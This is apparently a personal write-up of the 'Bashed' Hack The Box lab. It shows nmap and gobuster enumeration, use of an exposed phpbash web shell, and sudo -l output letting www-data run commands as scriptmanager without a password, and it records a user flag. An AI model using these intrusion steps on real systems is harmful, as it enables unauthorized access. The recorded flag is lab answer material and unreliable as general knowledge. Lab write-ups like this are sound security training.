#easy #linux 

## 0. **Lab infos**

**Difficulty :** Easy
**Name :** Bashed
**IP** : 10.129.66.167
**Objectives :** Get user and root flags
**OS :** Linux

##### **Conclusion**
**Time :** 59min
	**Start :** 10.02.2025 / 19:51
	**Break at/to :** 10.02.2025 / 20:09 || 10.02.2025 / 20:29
	**Finish :** 10.02.2025 / 21:10
**Satisfaction :**  6/10 Because I successfully pass all stages but I don't pass the escalation privileges
### 1. **Reconnaissance

Let's start with an #nmap scan :

```BASH
nmap -p- -sV 10.129.66.167
```

Output :

```BASH
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

There is only the port 80 so it's a web app.

With #burpsuite we can have the sitemap 

![[Pasted image 20250210195536.png]]

On `single.html` we discovered this :

![[Pasted image 20250210195702.png]]
![[Pasted image 20250210195710.png]]

Let's go on the github link.

![[Pasted image 20250210195903.png]]

It's a web shell.

With #gobuster we want to find more directory :

```BASH
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.66.167
```

Output :

```BASH
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.129.66.167/images/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.66.167/uploads/]
/php                  (Status: 301) [Size: 312] [--> http://10.129.66.167/php/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.66.167/css/]
/dev                  (Status: 301) [Size: 312] [--> http://10.129.66.167/dev/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.66.167/js/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.66.167/fonts/]
Progress: 67384 / 220561 (30.55%)
```

`/php` seems interesting.

![[Pasted image 20250210200549.png]]
![[Pasted image 20250210200602.png]]

Nothing.

![[Pasted image 20250210200627.png]]

Here we are.

## 2. **Weaponization

## 3. **Delivery

## 4. **Exploitation

Now, we are in the web shell.

![[Pasted image 20250210200734.png]]

```BASH

www-data@bashed
:/var/www/html/dev# ls

phpbash.min.php
phpbash.php
www-data@bashed
:/var/www/html/dev# pwd

/var/www/html/dev
www-data@bashed
:/var/www/html/dev# whoami

www-data
www-data@bashed
:/var/www/html/dev# group

sh: 1: group: not found
www-data@bashed
:/var/www/html/dev# groups

www-data
```

We are `www-data` part of the group `www-data`.


## 5. **Installation

## 6. **Command and Control

Now we want to escalate our privileges

And we can see there is another user 

```BASH
www-data@bashed
:/home# ls

arrexel
scriptmanager
```

Let's try to connect with no pass

```BASH
www-data@bashed
:/home/arrexel# su scriptmanager

su: must be run from a terminal
```


But with this command we can see that we can execute command as this user without pass 

```BASH
sudo -l -U www-data

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

```BASH
www-data@bashed
:/var/www/html/dev# sudo -u scriptmanager whoami

scriptmanager
```

With `sudo -u scriptmanager ls -l` we can see all the permission off `scriptmanager` :

```BASH
total 80
drwxr-xr-x 2 root root 4096 Jun 2 2022 bin
drwxr-xr-x 3 root root 4096 Jun 2 2022 boot
drwxr-xr-x 19 root root 4140 Feb 10 09:54 dev
drwxr-xr-x 89 root root 4096 Jun 2 2022 etc
drwxr-xr-x 4 root root 4096 Dec 4 2017 home
lrwxrwxrwx 1 root root 32 Dec 4 2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x 19 root root 4096 Dec 4 2017 lib
drwxr-xr-x 2 root root 4096 Jun 2 2022 lib64
drwx------ 2 root root 16384 Dec 4 2017 lost+found
drwxr-xr-x 4 root root 4096 Dec 4 2017 media
drwxr-xr-x 2 root root 4096 Jun 2 2022 mnt
drwxr-xr-x 2 root root 4096 Dec 4 2017 opt
dr-xr-xr-x 173 root root 0 Feb 10 09:54 proc
drwx------ 3 root root 4096 Feb 10 09:54 root
drwxr-xr-x 18 root root 520 Feb 10 09:54 run
drwxr-xr-x 2 root root 4096 Dec 4 2017 sbin
drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jun 2 2022 scripts
drwxr-xr-x 2 root root 4096 Feb 15 2017 srv
dr-xr-xr-x 13 root root 0 Feb 10 09:54 sys
drwxrwxrwt 10 root root 4096 Feb 10 11:43 tmp
drwxr-xr-x 10 root root 4096 Dec 4 2017 usr
drwxr-xr-x 12 root root 4096 Jun 2 2022 var
lrwxrwxrwx 1 root root 29 Dec 4 2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

We can go in `/scripts`

```BASH
www-data@bashed
:/# sudo -u scriptmanager ls scripts

test.py
test.txt
```
## 7. **Actions on Objectives

Let's go fin the user flag :

`967f02d05f1512620b7a0531e4c6d518`